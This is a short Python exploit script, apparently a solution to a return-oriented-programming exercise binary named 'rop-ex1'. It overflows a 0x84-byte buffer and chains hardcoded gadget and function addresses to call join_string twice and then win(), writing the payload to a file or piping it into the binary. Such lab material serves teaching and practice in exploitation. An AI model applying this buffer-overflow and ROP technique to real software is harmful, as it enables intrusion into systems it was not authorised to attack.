#!/usr/bin/env python3
import sys
import os

#Overflow buffer with input to change the flow of execution in vuln as follow:
#	Call join_string(*str3,*str1)
#	Call join_string(*str3,*str2)
#	Call win()

PAYLOAD_FILE = 'input_rop-ex1.txt'
VULN_FILE = './rop-ex1'

def get_vuln_overflow_payload():
	buff_len = 0x84
	PAYLOAD = b'A'*buff_len+\
		b'EBP0'
	return PAYLOAD


def get_vuln_payload():
	win_addr = 0x080491ba.to_bytes(4,'little')
	str1_addr = 0x0804c024.to_bytes(4,'little')
	str2_addr = 0x0804c044.to_bytes(4,'little')
	str3_addr = 0x0804c050.to_bytes(4,'little')
	join_string_addr = 0x08049196.to_bytes(4,'little')
	add_esp_pop = 0x0804901f.to_bytes(4,'little')

	PAYLOAD = get_vuln_overflow_payload()+\
		join_string_addr+\
		add_esp_pop+\
		str3_addr+\
		str1_addr+\
		b'_EBX'+\
		join_string_addr+\
		win_addr+\
		str3_addr+\
		str2_addr
	return PAYLOAD

def output(payload):
	with open(PAYLOAD_FILE,'wb') as f:
		f.write(payload)


def solve(PAYLOAD):
	output(PAYLOAD)
	os.system(f'{VULN_FILE} < {PAYLOAD_FILE}')

def main(mode):
	PAYLOAD = get_vuln_payload()
	print(f"mode: {mode}")
	if mode == 'interactive':
		solve(PAYLOAD)
	elif mode == 'file':
		output(PAYLOAD)
	elif mode == 'inline':
		sys.stdout.buffer.write(PAYLOAD)
	else:
		output(PAYLOAD)
		solve(PAYLOAD)
	return


if __name__ == '__main__':
	if len(sys.argv) < 2:
		print(f"Usage: {sys.argv[0]} [interactive,file,both]")
	else:
		main(sys.argv[1])

